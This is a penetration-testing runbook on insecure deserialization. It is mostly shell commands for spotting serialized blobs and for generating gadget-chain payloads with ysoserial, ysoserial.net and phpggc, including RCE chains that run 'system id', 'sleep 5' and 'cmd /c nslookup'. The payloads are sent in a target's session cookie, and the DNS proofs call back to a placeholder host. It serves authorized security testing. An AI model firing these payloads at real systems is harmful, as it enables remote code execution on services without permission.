---
title: "Deserialization"
description: "Identifying insecure deserialization across Java, PHP, Python, .NET and Node, gadget chains, safe detection, and proof with sleep or OOB."
phase: Web
order: 29
tags:
  - deserialization
  - rce
  - java
  - php
tools:
  - burp suite
  - ysoserial
updated: 2026-10-01
---

A deserialization runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: identify the serialization format and library, then prove exploitation safely with a sleep or out-of-band callback before considering code execution.

## 1. Identify the format

Read magic bytes and markers on cookies, view states, and API bodies.

```bash
# Capture a serialized blob
curl -s -c jar.txt "https://target.com/" -o page.html
grep -ioE "rO0[A-Za-z0-9+/=]+|O:[0-9]+:\"|a:[0-9]+:\{|AC ED 00 05|gASV" page.html jar.txt

# Java: base64 rO0 = Java serialized object
echo "rO0ABXNy..." | base64 -d | xxd | head

# PHP: O:classlen:"Class":... ; Python pickle: gASV... ; .NET: AAEAAAD/////
```

## 2. Detect Java (ysoserial)

```bash
# Generate a URLDNS gadget — DNS only, no code execution, ideal first proof
ysoserial URLDNS "http://UNIQUE.oob.example" > payload.bin
base64 -w0 payload.bin > payload.b64

# Send it in the suspected sink
curl -s -b "session=$(cat payload.b64)" "https://target.com/" -o /dev/null
```

A DNS hit confirms the object was deserialized (calls `hashCode`) without running commands.

## 3. Detect .NET (ysoserial.net)

```bash
# Use a benign gadget that triggers a DNS callback
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "cmd /c nslookup UNIQUE.oob.example" -o base64

# Or the ObjectDataProvider variant against a JSON endpoint
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c nslookup UNIQUE.oob.example" -o raw
```

## 4. Detect PHP (phpggc)

```bash
# List available gadget chains for the target framework
phpggc -l | grep -i laravel
phpggc -l | grep -i symfony
phpggc -l | grep -i monolog

# Generate a chain, base64 the payload
phpggc Monolog/RCE1 system id -b
```

## 5. Prove with timing

When callbacks are blocked, use a measurable delay.

```bash
# Java sleep via a gadget chain (replace with a chain available for the libs in use)
ysoserial CommonsCollections5 "sleep 5" > sleep.bin
time curl -s -b "session=$(base64 -w0 sleep.bin)" "https://target.com/" -o /dev/null
```

## 6. Decode and inspect unknown blobs

```bash
# Java stream header check
base64 -d blob.txt 2>/dev/null | xxd | head -c 64

# Python pickle opcodes
python3 -c "import pickletools,sys; pickletools.dis(open('blob.bin','rb').read())"

# Decode a JSON-wrapped Java object
cat blob.json | jq -r '.["@class"], .data' 2>/dev/null
```

## Full pipeline

```bash
# 1. Capture and detect format
curl -s -c jar.txt "https://target.com/" -o page.html
grep -ioE "rO0[A-Za-z0-9+/=]+|O:[0-9]+:\"|AC ED 00 05|gASV" page.html jar.txt

# 2. Java DNS-only proof
ysoserial URLDNS "http://UNIQUE.oob.example" > payload.bin
curl -s -b "session=$(base64 -w0 payload.bin)" "https://target.com/" -o /dev/null

# 3. .NET callback proof
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c nslookup UNIQUE.oob.example" -o base64

# 4. PHP gadget enumeration
phpggc -l | grep -i laravel
phpggc Monolog/RCE1 system id -b

# 5. Timing fallback
ysoserial CommonsCollections5 "sleep 5" > sleep.bin
time curl -s -b "session=$(base64 -w0 sleep.bin)" "https://target.com/" -o /dev/null
```

## Ethics & legality

- Only test deserialization in systems within the authorized scope.
- Prefer URLDNS/DNS-only proofs; escalate to RCE only with explicit permission.
- Never use payloads that alter data or persist on the target.
- Preserve the raw blob, generated payload, and callback/timing evidence.
